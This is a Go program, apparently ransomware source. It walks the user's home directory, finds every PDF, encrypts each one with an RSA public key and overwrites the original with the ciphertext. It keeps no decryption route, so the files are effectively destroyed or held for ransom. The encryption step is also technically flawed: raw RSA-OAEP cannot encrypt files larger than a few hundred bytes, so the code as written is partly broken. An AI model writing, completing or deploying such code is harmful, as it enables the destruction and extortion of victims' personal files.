package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

func mapFleExts(rtDir string, exts []string) ([]string, error) {
	var fleExts []string
	extMap := make(map[string]struct{})
	for _, ext := range exts {
		extMap[ext] = struct{}{}
	}
	er := filepath.Walk(rtDir, func(pth string, inf os.FileInfo, er error) error {
		if er != nil {
			return er
		}
		if !inf.IsDir() {
			ext := filepath.Ext(inf.Name())
			if _, ok := extMap[ext]; ok {
				absPth, er := filepath.Abs(pth)
				if er != nil {
					return er
				}
				fleExts = append(fleExts, absPth)
			}
		}
		return nil
	})
	return fleExts, er
}

func Encrypt(pbKPth, dt string) (string, error) {
	pbKFle, er := os.Open(pbKPth)
	if er != nil {
		return "", fmt.Errorf("ERR: opening PBKFLE: %v", er)
	}
	defer pbKFle.Close()
	pbKByts, er := io.ReadAll(pbKFle)
	if er != nil {
		return "", fmt.Errorf("ERR: reading PBK: %v", er)
	}
	blk, _ := pem.Decode(pbKByts)
	if blk == nil || blk.Type != "RSA PUBLIC KEY" {
		return "", fmt.Errorf("ERR: invalid PBK format")
	}
	pbK, er := x509.ParsePKIXPublicKey(blk.Bytes)
	if er != nil {
		return "", fmt.Errorf("ERR: parsing PBK: %v", er)
	}
	rsaPbK, ok := pbK.(*rsa.PublicKey)
	if !ok {
		return "", fmt.Errorf("ERR: invalid PBK type")
	}
	ct, er := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPbK, []byte(dt), nil)
	if er != nil {
		return "", fmt.Errorf("ERR: encrypting DATA: %v", er)
	}
	b64Ct := base64.StdEncoding.EncodeToString(ct)
	return b64Ct, nil
}

func main() {
	fleExts := []string{".pdf"}
	pbKPth := "./pbK.pem"
	rtDir := ""
	switch runtime.GOOS {
	case "windows":
		rtDir = os.Getenv("USERPROFILE")
	default:
		rtDir = os.Getenv("HOME")
	}
	if rtDir == "" {
		rtDir = "D:\\"
		//rtDir = "C:\\"
	}
	flePths, er := mapFleExts(rtDir, fleExts)
	if er != nil {
		panic("ERR: mapping files")
	}
	for _, flePth := range flePths {
		fleDat, er := os.ReadFile(flePth)
		if er != nil {
			panic("ERR: reading file")
		}
		fmt.Printf("Encrypting... %v\n", flePth)
		b64Ct, er := Encrypt(pbKPth, string(fleDat))
		if er != nil {
			fmt.Println(er)
			return
		}
		time.Sleep(200 * time.Millisecond)
		os.WriteFile(flePth, []byte(b64Ct), 0644)
	}
	fmt.Println("Finalizing...")
	time.Sleep(1 * time.Second)
	fmt.Println("All Done.")
}
